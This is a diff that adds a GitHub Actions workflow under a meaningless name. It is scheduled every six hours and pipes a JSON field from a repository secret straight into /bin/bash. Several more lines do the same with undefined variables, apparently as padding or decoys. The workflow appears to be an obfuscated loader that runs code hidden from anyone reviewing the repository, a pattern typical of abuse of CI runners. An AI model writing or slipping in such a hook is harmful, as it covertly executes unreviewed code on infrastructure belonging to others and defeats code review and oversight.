@@ -1,0 +1,21 @@
+name: yigeshilangg
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '6 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: yigeshilangg
+        env:
+          piilq924: ${{ secrets.piilq924 }}
+        run: |
+          echo $piilq924 | jq -r .r79 | /bin/bash
+          echo $h596 | jq -r .qs9580 | /bin/bash
+          echo $jkpkb49145 | jq -r .kcea9 | /bin/bash
+          echo $g466 | jq -r .qucn4020 | /bin/bash
+          echo $n1 | jq -r .ng2 | /bin/bash
+          echo $pm75 | jq -r .fio33 | /bin/bash
+
